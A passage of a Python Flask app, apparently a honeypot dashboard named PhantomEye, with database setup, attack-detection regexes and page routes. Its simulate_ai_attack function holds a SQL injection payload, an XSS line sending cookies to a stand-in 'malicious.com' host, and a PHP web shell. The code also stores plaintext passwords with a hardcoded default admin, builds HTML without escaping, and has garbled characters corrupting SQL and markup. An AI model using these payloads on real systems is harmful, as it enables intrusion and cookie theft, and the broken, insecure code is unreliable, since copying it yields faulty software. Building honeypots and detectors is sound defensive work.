                <span style="color: var(--accent);">{stats_honeypot_interactions}</span>
            </div>
            <div class="interaction-item">
                <span>Last Attack:</span>
                <span style="color: var(--accent);">{last_attack_time}</span>
            </div>

            <div class="progress-bar" style="margin-top: 15px;">
                <div class="progress-fill" style="width: 85%;"></div>
            </div>
            <div style="text-align: center; font-size: 12px; margin-top: 5px;">System Security: 85%</div>
        </div>

        <div class="card" style="margin-top: 20px;">
            <h3>AI DEFENSE STATUS</h3>
            <div class="terminal">
                <div class="terminal-command">$ ai-defense --status</div>
                <div class="terminal-output">> AI Models: Active</div>
                <div class="terminal-output">> Threat Detection: Enabled</div>
                <div class="terminal-output">> Pattern Analysis: Running</div>
                <div class="terminal-output">> Defense Level: Maximum</div>
            </div>
        </div>
    </div>
</div>'''


# =============== DATABASE & CORE FUNCTIONALITY ===============
def init_db():
    conn = sqlite3.connect(app.config['DATABASE_PATH'])
    c = conn.cursor()

    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE NOT NULL,
                 password TEXT NOT NULL,
                 email TEXT NOT NULL,
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')

    # Attacks table
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 ip TEXT NOT NULL,
                 payload TEXT,
                 attack_type TEXT,
                 severity TEXT,
                 country TEXT,
                 city TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 user_id INTEGER,
                 website_id INTEGER,
                 is_ai_generated BOOLEAN DEFAULT 0)''')

    # Websites table
    c.execute('''CREATE TABLE IF NOT EXISTS websites
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 url TEXT NOT NULL,
                 name TEXT,
                 platform TEXT,
                 status TEXT DEFAULT 'active',
                 created_at DATETIME DEFAULT CURRENT极STAMP,
                 user_id INTEGER)''')

    # Mobile Apps table - CORRECTED
    c.execute('''CREATE TABLE IF NOT EXISTS mobile_app
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 name TEXT NOT NULL,
                 package TEXT,
                 platform TEXT NOT NULL,
                 description TEXT,
                 status TEXT DEFAULT 'active',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 user_id INTEGER)''')

    # Honeypots table
    c.execute('''CREATE TABLE IF NOT EXISTS honeypots
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 name TEXT NOT NULL,
                 type TEXT NOT NULL,
                 url_path TEXT NOT NULL,
                 target_url TEXT,
                 description TEXT,
                 status TEXT DEFAULT 'active',
                 interactions INTEGER DEFAULT 0,
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 user_id INTEGER)''')

    # Honeypot interactions table
    c.execute('''CREATE TABLE IF NOT EXISTS honeypot_interactions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 honeypot_id INTEGER,
                 ip_address TEXT,
                 action_type TEXT,
                 data TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')

    # AI Patterns table
    c.execute('''CREATE TABLE IF NOT EXISTS ai_patterns
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 pattern TEXT NOT NULL,
                 pattern_type TEXT NOT NULL,
                 description TEXT,
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')

    # Insert default admin user if not exists
    try:
        c.execute("INSERT INTO users (username, password, email) VALUES (?, ?, ?)",
                  ('admin', 'phantom123', 'admin@example.com'))

        # Insert default honeypots
        c.execute("INSERT INTO honeypots (name, type, url_path, description, user_id) VALUES (?, ?, ?, ?, ?)",
                  ('Admin Login Portal', 'login', '/admin-login', 'Fake admin login page', 1))
        c.execute("INSERT INTO honeypots (name, type, url_path, description, user_id) VALUES (?, ?, ?, ?, ?)",
                  ('Database Manager', 'database', '/phpmyadmin', 'Fake database interface', 1))
        c.execute("INSERT INTO honeypots (name, type, url_path, description, user_id) VALUES (?, ?, ?, ?, ?)",
                  ('API Endpoint', 'api', '/api/v1/users', 'Fake API endpoint', 1))

        # Insert AI detection patterns
        ai_patterns = [
            (r'/\*.*?\*/', 'sql_comment', 'AI-generated SQL comments'),
            (r'\b(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION).{100,}', 'sql_length', 'Long AI-generated SQL queries'),
            (r'<script>[^<]{200,}</script>', 'xss_length', 'Long AI-generated XSS payloads'),
            (r'eval\(.*?\)|exec\(.*?\)', 'code_execution', 'AI-generated code execution attempts'),
            (r'/\*![0-9]{5}.*?\*/', 'mysql_conditional', 'MySQL conditional comments often used by AI'),
            (r'user-agent.*(chatgpt|gpt|ai|bot|automated)', 'ai_user_agent', 'AI user agents'),
            (r'waitfor delay \'[0-9]:[0-9]{2}:[0-9]{2}\'', 'time_based_sqli', 'Time-based SQL injection'),
        ]

        c.executemany("INSERT INTO ai_patterns (pattern, pattern_type, description) VALUES (?, ?, ?)", ai_patterns)

    except sqlite3.IntegrityError:
        pass  # Ignore if user already exists

    conn.commit()
    conn.close()
    print("✅ Database initialized successfully!")


def get_db_connection():
    conn = sqlite3.connect(app.config['DATABASE_PATH'])
    conn.row_factory = sqlite3.Row
    return conn


def send_email_alert(recipient_email, subject, message):
    """Send email alert using SMTP"""
    try:
        msg = MIMEMultipart()
        msg['From'] = app.config['MAIL_DEFAULT_SENDER']
        msg['To'] = recipient_email
        msg['Subject'] = f'🚨 PhantomEye Alert: {subject}'

        body = f"""
        PhantomEye Security Alert
        =========================

        {message}

        Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

        Please review your dashboard for more details:
        http://localhost:5000/dashboard

        ---
        This is an automated message from PhantomEye Security System.
        """

        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP(app.config['MAIL_SERVER'], app.config['MAIL_PORT']) as server:
            server.starttls()
            server.login(app.config['MAIL_USERNAME'], app.config['MAIL_PASSWORD'])
            server.send_message(msg)

        print(f"Email alert sent to {recipient_email}")
        return True
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False


def detect_ai_attack(payload, user_agent=None):
    """Detect AI-generated attacks using pattern matching"""
    conn = get_db_connection()
    patterns = conn.execute('SELECT pattern, pattern_type, description FROM ai_patterns').fetchall()
    conn.close()

    ai_detected = False
    detection_reasons = []
    payload_lower = str(payload).lower()
    user_agent = str(user_agent or '').lower()

    for pattern in patterns:
        if re.search(pattern['pattern'], payload_lower, re.IGNORECASE | re.DOTALL):
            ai_detected = True
            detection_reasons.append(pattern['description'])

    if len(payload) > 500:
        ai_detected = True
        detection_reasons.append("Very long payload (likely AI-generated)")

    if payload.count('/*') > 3:
        ai_detected = True
        detection_reasons.append("Multiple SQL comments (AI pattern)")

    if 'union' in payload_lower and payload_lower.count('select') > 2:
        ai_detected = True
        detection_reasons.append("Complex UNION query structure")

    if any(ai_term in user_agent for ai_term in ['chatgpt', 'gpt-', 'ai-', 'bot', 'automated']):
        ai_detected = True
        detection_reasons.append("AI User-Agent detected")

    return ai_detected, detection_reasons


def detect_attack(payload, user_agent=None, ip=None):
    """Comprehensive attack detection with AI analysis and email alerts"""
    payload_lower = str(payload).lower()

    sql_patterns = [r".*([';]+|--|#).*", r".*union.*select.*", r".*insert.*into.*"]
    xss_patterns = [r".*<script>.*</script>.*", r".*javascript:.*", r".*onerror=.*"]

    attack_detected = False
    attack_type = "Unknown"
    severity = "low"

    if any(re.search(pattern, payload_lower, re.IGNORECASE) for pattern in sql_patterns):
        attack_detected = True
        attack_type = "SQL Injection"
        severity = "high"

    elif any(re.search(pattern, payload_lower, re.IGNORECASE) for pattern in xss_patterns):
        attack_detected = True
        attack_type = "XSS"
        severity = "medium"

    ai_detected, ai_reasons = detect_ai_attack(payload, user_agent)
    if ai_detected:
        attack_detected = True
        attack_type = f"AI-Generated {attack_type}" if attack_type != "Unknown" else "AI-Generated Attack"
        severity = "critical"

    if attack_detected and 'user_id' in session:
        conn = get_db_connection()
        user = conn.execute('SELECT email FROM users WHERE id = ?', (session['user_id'],)).fetchone()
        conn.close()

        if user:
            email_message = f"""
            Attack Type: {attack_type}
            Severity: {severity}
            IP Address: {ip or 'Unknown'}
            Payload: {payload[:200]}{'...' if len(payload) > 200 else ''}
            {'AI Detection: ' + ', '.join(ai_reasons) if ai_detected else ''}
            """

            send_email_alert(user['email'], f"{attack_type} Detected", email_message)

    return attack_detected, attack_type, severity, ai_detected, ai_reasons


def simulate_ai_attack():
    """Generate a realistic AI-powered attack for demonstration"""
    ai_attacks = [
        {
            'payload': "1' AND (SELECT 7100 FROM(SELECT COUNT(*),CONCAT(0x716a707071,(SELECT (ELT(7100=7100,1))),0x71706a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'vGwx'='vGwx",
            'type': 'SQL Injection',
            'description': 'AI-generated Boolean-based SQL Injection'
        },
        {
            'payload': "<script>fetch(`https://malicious.com/steal?cookie=${document.cookie}`)</script>",
            'type': 'XSS',
            'description': 'AI-generated XSS with exfiltration'
        },
        {
            'payload': "<?php system($_GET['cmd']); ?>",
            'type': 'Code Execution',
            'description': 'AI-generated PHP code execution'
        }
    ]

    return random.choice(ai_attacks)


def get_play_store_suggestions(query):
    """Get app suggestions from Play Store (simulated)"""
    popular_apps = [
        {"name": "Facebook", "package": "com.facebook.katana", "category": "Social"},
        {"name": "WhatsApp", "package": "com.whatsapp", "category": "Communication"},
        {"name": "Instagram", "package": "com.instagram.android", "category": "Social"},
        {"name": "Twitter", "package": "com.twitter.android", "category": "Social"},
        {"name": "TikTok", "package": "com.zhiliaoapp.musically", "category": "Entertainment"},
        {"name": "Spotify", "package": "com.spotify.music", "category": "Music"},
        {"name": "Netflix", "package": "com.netflix.mediaclient", "category": "Entertainment"},
        {"name": "Amazon Shopping", "package": "com.amazon.mShop.android.shopping", "category": "Shopping"},
        {"name": "Gmail", "package": "com.google.android.gm", "category": "Communication"},
        {"name": "Google Maps", "package": "com.google.android.apps.maps", "category": "Navigation"},
        {"name": "YouTube", "package": "com.google.android.youtube", "category": "Entertainment"},
        {"name": "Snapchat", "package": "com.snapchat.android", "category": "Social"},
        {"name": "Telegram", "package": "org.telegram.messenger", "category": "Communication"},
        {"name": "PayPal", "package": "com.paypal.android.p2pmobile", "category": "Finance"},
        {"name": "Uber", "package": "com.ubercab", "category": "Travel"},
        {"name": "LinkedIn", "package": "com.linkedin.android", "category": "Business"},
        {"name": "Discord", "package": "com.discord", "category": "Communication"},
        {"name": "Reddit", "package": "com.reddit.frontpage", "category": "Social"},
        {"name": "Pinterest", "package": "com.pinterest", "category": "Lifestyle"},
        {"name": "Booking.com", "package": "com.booking", "category": "Travel"},
    ]

    suggestions = [app for app in popular_apps if query.lower() in app['name'].lower()]
    return suggestions[:5]


def clone_website(url):
    """Clone a website for honeypot purposes"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        platform = "Unknown"
        if soup.find('meta', {'name': 'generator', 'content': re.compile('wordpress', re.I)}):
            platform = "WordPress"
        elif soup.find('link', {'href': re.compile('wp-content', re.I)}):
            platform = "WordPress"
        elif soup.find('script', {'src': re.compile('shopify', re.I)}):
            platform = "Shopify"

        return platform, str(soup)

    except Exception as e:
        return "Unknown", f"<html><body><h1>Error cloning website: {str(e)}</h1></body></html>"


def clone_website_complete(url):
    """Complete website cloning with local hosting capability"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        platform = "Unknown"
        if soup.find('meta', {'name': 'generator', 'content': re.compile('wordpress', re.I)}):
            platform = "WordPress"
        elif soup.find('link', {'href': re.compile('wp-content', re.I)}):
            platform = "WordPress"
        elif soup.find('script', {'src': re.compile('shopify', re.I)}):
            platform = "Shopify"
        elif 'wp-' in response.text.lower():
            platform = "WordPress"
        elif 'shopify' in response.text.lower():
            platform = "Shopify"

        return platform, str(soup), url

    except Exception as e:
        return "Unknown", f"<html><body><h1>Error cloning website: {str(e)}</h1></body></html>", url


def create_app_honeypot(app_name, package_name):
    """Create a fake mobile app honeypot"""
    fake_app_html = f'''
    <div class="container">
        <h2>🔒 {app_name} - Mobile App Honeypot</h2>
        <div class="card">
            <h3>App Information</h3>
            <p><strong>Package:</strong> {package_name}</p>
            <p><strong>Status:</strong> 🔥 Honeypot Active</p>
            <p><strong>Detection:</strong> Monitoring API calls and attacks</p>
        </div>

        <div class="card">
            <h3>Fake Login Screen</h3>
            <div class="form-group">
                <label>Username:</label>
                <input type="text" placeholder="Enter username">
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" placeholder="Enter password">
            </div>
            <button class="btn">Login</button>
        </div>

        <div class="card">
            <h3>API Endpoints Being Monitored</h3>
            <div class="terminal">
                <div class="terminal-command">POST /api/v1/login</div>
                <div class="terminal-command">GET /api/v1/user/data</div>
                <div class="terminal-command">POST /api/v1/payment</div>
                <div class="terminal-output">> Honeypot active - capturing all requests</div>
            </div>
        </div>
    </div>
    '''

    return fake_app_html


def log_honeypot_interaction(honeypot_id, interaction_type, data):
    """Log honeypot interactions"""
    conn = get_db_connection()
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    conn.execute('''
        INSERT INTO honeypot_interactions (honeypot_id, ip_address, action_type, data)
        VALUES (?, ?, ?, ?)
    ''', (honeypot_id, ip, interaction_type, f'{data} | User-Agent: {user_agent}'))

    conn.execute('UPDATE honeypots SET interactions = interactions + 1 WHERE id = ?', (honeypot_id,))

    conn.commit()
    conn.close()


def hash(text):
    """Simple hash function for generating unique IDs"""
    return hashlib.md5(text.encode()).hexdigest()[:8]


def flash(message, category='info'):
    """Store flash messages in session"""
    if 'flashes' not in session:
        session['flashes'] = []

    session['flashes'].append({
        'message': message,
        'category': category
    })
    session.modified = True


def get_flashed_messages():
    """Retrieve and clear flash messages from session"""
    flashes = session.pop('flashes', []) if 'flashes' in session else []

    alerts_html = ""
    for flash_msg in flashes:
        # Determine alert class based on category
        if flash_msg['category'] == 'success':
            alert_class = 'alert-success'
        elif flash_msg['category'] in ['danger', 'error']:
            alert_class = 'alert-danger'
        elif flash_msg['category'] == 'warning':
            alert_class = 'alert-warning'
        else:
            alert_class = 'alert-info'

        alerts_html += f'<div class="alert {alert_class}">{flash_msg["message"]}</div>'

    return alerts_html

def update_database_schema():
    """Update database schema if needed"""
    conn = get_db_connection()
    c = conn.cursor()

    try:
        c.execute("PRAGMA table_info(honeypots)")
        columns = [column[1] for column in c.fetchall()]

        if 'target_url' not in columns:
            print("Adding target_url column to honeypots table...")
            c.execute("ALTER TABLE honeypots ADD COLUMN target_url TEXT")
            conn.commit()
            print("Database schema updated successfully!")

    except Exception as e:
        print(f"Error updating database schema: {e}")

    conn.close()


# =============== FLASK ROUTES ===============
@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Login",
        username="Guest",
        content=LOGIN_HTML,
        alerts=get_flashed_messages(),
        dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        conn = get_db_connection()
        user = conn.execute('SELECT * FROM users WHERE username = ? AND password = ?',
                            (username, password)).fetchone()
        conn.close()

        if user:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['user_email'] = user['email']
            flash('Login successful!', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid credentials. Please try again.', 'danger')

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Login",
        username="Guest",
        content=LOGIN_HTML,
        alerts=get_flashed_messages(),
        dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        email = request.form.get('email')

        try:
            valid = validate_email(email)
            email = valid.email

            conn = get_db_connection()
            existing_user = conn.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone()
            if existing_user:
                flash('Username already exists. Please choose a different one.', 'danger')
                conn.close()
                return redirect(url_for('register'))

            conn.execute('INSERT INTO users (username, password, email) VALUES (?, ?, ?)',
                         (username, password, email))
            conn.commit()
            conn.close()

            flash('Registration successful! Please login.', 'success')
            return redirect(url_for('login'))

        except EmailNotValidError as e:
            flash(f'Invalid email address: {str(e)}', 'danger')
        except Exception as e:
            flash(f'Error creating account: {str(e)}', 'danger')

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Register",
        username="Guest",
        content=REGISTER_HTML,
        alerts=get_flashed_messages(),
                dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    conn = get_db_connection()
    stats = conn.execute('''
        SELECT 
            COUNT(*) as total_attacks,
            COUNT(DISTINCT ip) as unique_attackers,
            SUM(CASE WHEN severity = "critical" THEN 1 ELSE 0 END) as critical_attacks,
            (SELECT COUNT(*) FROM honeypots WHERE user_id = ? AND status = "active") as active_honeypots,
            (SELECT COUNT(*) FROM websites WHERE user_id = ? AND status = "active") as protected_websites,
            (SELECT COUNT(*) FROM mobile_app WHERE user_id = ? AND status = "active") as protected_apps,
            (SELECT COUNT(*) FROM attacks WHERE user_id = ? AND is_ai_generated = "active") as ai_attacks,
            (SELECT COUNT(*) FROM honeypot_interactions hi 
             JOIN honeypots h ON hi.honeypot_id = h.id WHERE h.user_id = ?) as honeypot_interactions,
            (SELECT timestamp FROM attacks WHERE user_id = ? ORDER BY timestamp DESC LIMIT 1) as last_attack_time
        FROM attacks WHERE user_id = ?
    ''', (session['user_id'], session['user_id'], session['user_id'], session['user_id'],
          session['user_id'], session['user_id'], session['user_id'])).fetchone()

    attacks = conn.execute('''
        SELECT a.*, w.name as website_name 
        FROM attacks a 
        LEFT JOIN websites w ON a.website_id = w.id 
        WHERE a.user_id = ? 
        ORDER BY a.timestamp DESC 
        LIMIT 5
    ''', (session['user_id'],)).fetchall()

    honeypots = conn.execute('''
        SELECT * FROM honeypots 
        WHERE user_id = ? AND status = "active" 
        ORDER BY created_at DESC
        LIMIT 3
    ''', (session['user_id'],)).fetchall()

    conn.close()

    attacks_rows = ""
    if attacks:
        for attack in attacks:
            severity_class = f"severity-{attack['severity'] or 'low'}"
            ai_badge = '<span class="ai-detection-badge">AI</span>' if attack['is_ai_generated'] else ''
            attacks_rows += f"""
            <tr>
                <td>{attack['timestamp']}</td>
                <td>{attack['ip']}</td>
                <td>{attack['attack_type']}{ai_badge}</td>
                <td class="{severity_class}">{attack['severity'] or 'low'}</td>
                <td>{"✅" if attack['is_ai_generated'] else "❌"}</td>
            </tr>
            """
    else:
        attacks_rows = """
        <tr>
            <td colspan="5" style="text-align: center; color: #888;">No attacks detected yet</td>
        </tr>
        """

    active_honeypots = ""
    if honeypots:
        for honeypot in honeypots:
            status_class = "status-active"
            active_honeypots += f"""
            <div class="honeypot-card">
                <h3>{honeypot["name"]}</h3>
                <p><strong>Type:</strong> {honeypot["type"].title()}</p>
                <p><strong>URL:</strong> {honeypot["url_path"]}</p>
                <p><strong>Interactions:</strong> {honeypot["interactions"]}</p>
                <p><strong>Status:</strong> <span class="honeypot-status {status_class}">{honeypot["status"].upper()}</span></p>
            </div>
            """
    else:
        active_honeypots = """
        <div class="card">
            <p style="text-align: center; color: #888;">No active honeypots</p>
            <div style="text-align: center; margin-top: 20px;">
                <a href="/add-honeypot" class="btn">CREATE YOUR FIRST HONEYPOT</a>
            </div>
        </div>
        """

    last_attack_time = stats['last_attack_time'] if stats and stats['last_attack_time'] else 'Never'

    dashboard_content = DASHBOARD_HTML.format(
        stats_total_attacks=stats['total_attacks'] if stats else 0,
        stats_ai_attacks=stats['ai_attacks'] if stats else 0,
        stats_critical_attacks=stats['critical_attacks'] if stats else 0,
        stats_active_honeypots=stats['active_honeypots'] if stats else 0,
        stats_websites=stats['protected_websites'] if stats else 0,
        stats_apps=stats['protected_apps'] if stats else 0,
        stats_honeypot_interactions=stats['honeypot_interactions'] if stats else 0,
        last_attack_time=last_attack_time,
        attacks_rows=attacks_rows,
        active_honeypots=active_honeypots
    )

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Dashboard",
        username=session['username'],
        content=dashboard_content,
        alerts=get_flashed_messages(),
          dashboard_active='active',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/websites')
def websites():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    conn = get_db_connection()
    websites = conn.execute('SELECT * FROM websites WHERE user_id = ?', (session['user_id'],)).fetchall()
    conn.close()

    websites_content = f"""
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2>YOUR PROTECTED WEBSITES</h2>
        <div>
            <a href="/dashboard" class="btn btn-secondary" style="margin-right: 10px;">DASHBOARD</a>
            <a href="/add-website" class="btn">+ ADD WEBSITE</a>
        </div>
    </div>

    <div class="website-list">
        {"".join([f'''
        <div class="website-card">
            <h3>{website["name"]}</h3>
            <p><strong>URL:</strong> {website["url"]}</p>
            <p><strong>Platform:</strong> {website["platform"]}</p>
            <p><strong>Protected:</strong> {website["created_at"]}</p>
            <p><strong>Status:</strong> <span class="website-status status-active">ACTIVE</span></p>

            <div style="margin-top: 15px;">
                <button class="btn btn-small" onclick="showClonePreview('website', {website['id']}, '{website['name']}', '{website['url']}')">
                    👁️ PREVIEW CLONE
                </button>
                <button class="btn btn-small" style="margin-left: 5px;" onclick="testHoneypot('/honeypot-mirror/{hash(website['url'])}')">
                    TEST
                </button>
            </div>
        </div>
        ''' for website in websites]) if websites else '''
        <div class="card">
            <p style="text-align: center; color: #888;">NO WEBSITES PROTECTED YET</p>
            <div style="text-align: center; margin-top: 20px;">
                <a href="/add-website" class="btn">PROTECT YOUR FIRST WEBSITE</a>
            </div>
        </div>
        '''}
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Websites",
        username=session['username'],
        content=websites_content,
        alerts=get_flashed_messages(),
        dashboard_active='',
        websites_active='active',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/apps')
def apps():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    conn = get_db_connection()

    # Make sure the table name is correct here too
    apps = conn.execute('SELECT * FROM mobile_app WHERE user_id = ?', (session['user_id'],)).fetchall()
    conn.close()

    # Rest of your function...

    apps_content = f"""
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2>YOUR PROTECTED MOBILE APPLICATIONS</h2>
        <div>
            <a href="/dashboard" class="btn btn-secondary" style="margin-right: 10px;">DASHBOARD</a>
            <a href="/add-app" class="btn">+ PROTECT APP</a>
        </div>
    </div>

    <div class="app-list">
        {"".join([f'''
        <div class="app-card">
            <h3>{app["name"]}</h3>
            <p><strong>Package:</strong> {app["package"] or "Not specified"}</p>
            <p><strong>Platform:</strong> {app["platform"].upper()}</p>
            <p><strong>Protected:</strong> {app["created_at"]}</极>
            <p><strong>Status:</strong> <span class="app-status status-active">ACTIVE</span></p>

            <div style="margin-top: 15px;">
                <button class="btn btn-small" onclick="showClonePreview('app', {app['id']}, '{app['name']}')">
                    👁️ PREVIEW CLONE
                </button>
                <button class="btn btn-small" style="margin-left: 5px;" onclick="testHoneypot('/mobile-app/{hash(app['name'])}')">
                    TEST
                </button>
            </div>
        </div>
        ''' for app in apps]) if apps else '''
        <div class="card">
            <p style="text-align: center;极 color: #888;">NO MOBILE APPS PROTECTED YET</p>
            <div style="text-align: center; margin-top: 20px;">
                <a href="/add-app" class="btn">PROTECT YOUR FIRST APP</a>
            </div>
        </div>
        '''}
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Mobile Apps",
        username=session['username'],
        content=apps_content,
        dashboard_active='',
        alerts=get_flashed_messages(),
        websites_active='',
        apps_active='active',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/honeypots')
def honeypots():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    conn = get_db_connection()
    honeypots = conn.execute('SELECT * FROM honeypots WHERE user_id = ?', (session['user_id'],)).fetchall()

    honeypots_with_interactions = []
    for honeypot in honeypots:
        interactions = conn.execute('''
            SELECT * FROM honeypot_interactions 
            WHERE honeypot_id = ? 
            ORDER BY timestamp DESC 
            LIMIT 5
        ''', (honeypot['id'],)).fetchall()
        honeypots_with_interactions.append((honeypot, interactions))

    conn.close()

    honeypots_content = f"""
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2>YOUR ACTIVE HONEYPOTS</h2>
        <div>
            <a href="/dashboard" class="btn btn-secondary" style="margin-right: 10px;">DASHBOARD</a>
            <a href="/add-honeypot" class="btn">+ CREATE HONEYPOT</a>
        </div>
    </div>

    <div class="honeypot-list">
        {"".join([f'''
        <div class="honeypot-card">
            <h3>{honeypot["name"]}</h3>
            <p><strong>Type:</strong> {honeypot["type"].replace('_', ' ').title()}</p>
            <p><strong>URL:</strong> <code>{honeypot["url_path"]}</code></p>
            <p><strong>Interactions:</strong> {honeypot["interactions"]}</p>
            <p><strong>Status:</strong> <span class="honeypot-status status-active">ACTIVE</span></p>

            <div class="honeypot-interactions">
                <h4>Recent Activity:</h4>
                {"".join([f'''
                <div class="interaction-item">
                    <span>{interaction["timestamp"]}</span>
                    <span>{interaction["action_type"]}</span>
                    <span>{interaction["ip_address"]}</span>
                </div>
                ''' for interaction in interactions]) if interactions else '<p>No activity yet</p>'}
            </div>

            <div style="margin-top: 15px;">
                <button class="btn btn-small" onclick="showClonePreview('honeypot', {honeypot['id']}, '{honeypot['name']}')">
                    👁️ PREVIEW
                </button>
                <button class="btn btn-small" style="margin-left: 5px;" onclick="testHoneypot('{honeypot['url_path']}')">
                    TEST
                </button>
            </div>
        </div>
        ''' for honeypot, interactions in honeypots_with_interactions]) if honeypots else '''
        <div class="card">
            <p style="text-align: center; color: #888;">NO HONEYPOTS CREATED YET</p>
            <div style="text-align: center; margin-top: 20px;">
                <a href="/add-honeypot" class="btn">CREATE YOUR FIRST HONEYPOT</a>
            </div>
        </div>
        '''}
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Honeypots",
        username=session['username'],
        content=honeypots_content,
        alerts=get_flashed_messages(),

        dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='active',
        add_website_active='',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/add-website')
def add_website():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    add_website_content = """
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2>PROTECT NEW WEBSITE</h2>
        <a href="/dashboard" class="btn btn-secondary">BACK TO DASHBOARD</a>
    </div>

    <div class="card">
        <form method="POST" action="/add-website">
            <div class="form-group">
                <label for="website_url">WEBSITE URL:</label>
                <input type="url" id="website_url" name="website_url" placeholder="https://example.com" required>
            </div>
            <div class="form-group">
                <label for="website_name">DISPLAY NAME:</label>
                <input type="text" id="website_name" name="website_name" placeholder="My Online Store">
            </div>
            <button type="submit" class="btn">ACTIVATE PROTECTION</button>
        </form>
    </div>

    <div class="card">
        <h3 style="color: var(--accent); margin-top: 0;">PROTECTION METHODS</h3>
        <p><strong>Reverse Proxy:</strong> All traffic routes through PhantomEye first (Recommended)</p>
        <p><strong>JavaScript Snippet:</strong> Add our tracking code to your website</p>
        <p><strong>API Integration:</strong> Connect your application via REST API</极>
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Add Website",
        username=session['username'],
        content=add_website_content,
        alerts=get_flashed_messages(),
        dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='active',
        add_app_active='',
        add_honeypot_active=''
    ))


@app.route('/add-website', methods=['POST'])
def add_website_post():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    website_url = request.form.get('website_url')
    website_name = request.form.get('website_name') or website_url

    try:
        platform, cloned_content, original_url = clone_website_complete(website_url)
        url_hash = hash(website_url)
        honeypot_path = f'/honeypot-mirror/{url_hash}'

        conn = get_db_connection()

        try:
            conn.execute('''
                INSERT INTO honeypots (name, type, url_path, target_url, description, user_id) 
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                f"Mirror: {website_name}",
                'website_mirror',
                honeypot_path,
                website_url,
                f"Mirror of {website_url}",
                session['user_id']
            ))
        except sqlite3.OperationalError as e:
            if "no such column: target_url" in str(e):
                conn.execute('''
                    INSERT INTO honeypots (name, type, url_path, description, user_id) 
                    VALUES (?, ?, ?, ?, ?)
                ''', (
                    f"Mirror: {website_name}",
                    'website_mirror',
                    honeypot_path,
                    f"Mirror of {website_url}",
                    session['user_id']
                ))
            else:
                raise e

        conn.execute('''
